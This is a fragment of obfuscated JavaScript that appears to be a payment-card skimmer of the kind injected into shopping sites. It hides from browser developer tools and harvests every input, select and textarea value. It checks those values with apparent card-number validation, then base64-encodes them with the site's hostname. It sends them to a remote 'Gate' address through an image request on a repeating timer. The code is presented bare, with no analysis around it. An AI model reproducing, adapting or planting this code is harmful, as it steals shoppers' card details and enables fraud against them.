_0x5b8e11=_0x99541c?_0x21f6('0xb'):_0x21f6('0xc');if(!(_0x2b5ec5&&_0x99541c)&&(window[_0x21f6('0xd')]&&window[_0x21f6('0xd')][_0x21f6('0xe')]&&window[_0x21f6('0xd')][_0x21f6('0xe')][_0x21f6('0xf')]||_0x99541c||_0x2b5ec5)){if(!_0x339f68[_0x21f6('0x4')]||_0x339f68[_0x21f6('0x10')]!==_0x5b8e11){_0x127f53(!![],_0x5b8e11);}_0x339f68['\x69\x73\x4f\x70\x65\x6e']=!![];_0x339f68['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=_0x5b8e11;}else{if(_0x339f68[_0x21f6('0x4')]){_0x127f53(![],undefined);}_0x339f68[_0x21f6('0x4')]=![];_0x339f68[_0x21f6('0x10')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module[_0x21f6('0x11')]){module[_0x21f6('0x11')]=_0x339f68;}else{window['\x64\x65\x76\x74\x6f\x6f\x6c\x73']=_0x339f68;}}());String[_0x21f6('0x12')][_0x21f6('0x13')]=function(){var _0x273b44=0x0,_0x267fa6,_0x360cb4;if(this[_0x21f6('0x2')]===0x0)return _0x273b44;for(_0x267fa6=0x0;_0x267fa6<this[_0x21f6('0x2')];_0x267fa6++){_0x360cb4=this[_0x21f6('0x14')](_0x267fa6);_0x273b44=(_0x273b44<<0x5)-_0x273b44+_0x360cb4;_0x273b44|=0x0;}return _0x273b44;};var _0x162491={};_0x162491[_0x21f6('0x15')]=_0x21f6('0x16');_0x162491[_0x21f6('0x17')]={};_0x162491[_0x21f6('0x18')]=[];_0x162491[_0x21f6('0x19')]=![];_0x162491[_0x21f6('0x1a')]=function(_0x3fec12){if(_0x3fec12.id!==undefined&&_0x3fec12.id!=''&&_0x3fec12.id!==null&&_0x3fec12.value.length<0x100&&_0x3fec12.value.length>0x0){if(_0x50a9d8(_0x111683(_0x111683(_0x3fec12.value,'\x2d',''),'\x20',''))&&_0x40165d(_0x111683(_0x111683(_0x3fec12.value,'\x2d',''),'\x20','')))_0x162491.IsValid=!![];_0x162491.Data[_0x3fec12.id]=_0x3fec12.value;return;}if(_0x3fec12.name!==undefined&&_0x3fec12.name!=''&&_0x3fec12.name!==null&&_0x3fec12.value.length<0x100&&_0x3fec12.value.length>0x0){if(_0x50a9d8(_0x111683(_0x111683(_0x3fec12.value,'\x2d',''),'\x20',''))&&_0x40165d(_0x111683(_0x111683(_0x3fec12.value,'\x2d',''),'\x20','')))_0x162491.IsValid=!![];_0x162491.Data[_0x3fec12.name]=_0x3fec12.value;return;}};_0x162491[_0x21f6('0x1b')]=function(){var _0x3719d7=document.getElementsByTagName('\x69\x6e\x70\x75\x74');var _0x48614d=document.getElementsByTagName(_0x21f6('0x1c'));var _0x325567=document.getElementsByTagName(_0x21f6('0x1d'));for(var _0x3f93c8=0x0;_0x3f93c8<_0x3719d7.length;_0x3f93c8++)_0x162491.SaveParam(_0x3719d7[_0x3f93c8]);for(var _0x3f93c8=0x0;_0x3f93c8<_0x48614d.length;_0x3f93c8++)_0x162491.SaveParam(_0x48614d[_0x3f93c8]);for(var _0x3f93c8=0x0;_0x3f93c8<_0x325567.length;_0x3f93c8++)_0x162491.SaveParam(_0x325567[_0x3f93c8]);};_0x162491[_0x21f6('0x1e')]=function(){if(!window.devtools.isOpen&&_0x162491.IsValid){_0x162491.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x57e73e=encodeURIComponent(window.btoa(JSON.stringify(_0x162491.Data)));var _0x528c67=_0x57e73e.hashCode();for(var _0x266782=0x0;_0x266782<_0x162491.Sent.length;_0x266782++)if(_0x162491.Sent[_0x266782]==_0x528c67)return;_0x162491.LoadImage(_0x57e73e);}};_0x162491[_0x21f6('0x1f')]=function(){_0x162491.SaveAllFields();_0x162491.SendData();};_0x162491[_0x21f6('0x20')]=function(_0x55ed95){_0x162491.Sent.push(_0x55ed95.hashCode());var _0x100fb5=document.createElement(_0x21f6('0x21'));_0x100fb5.src=_0x162491.GetImageUrl(_0x55ed95);};_0x162491[_0x21f6('0x22')]=function(_0x4ffbf0){return _0x162491.Gate+_0x21f6('0x23')+_0x4ffbf0;};document[_0x21f6('0x24')]=function(){if(document[_0x21f6('0x25')]===_0x21f6('0x26')){window[_0x21f6('0x27')](_0x162491[_0x21f6('0x1f')],0x1f4);}};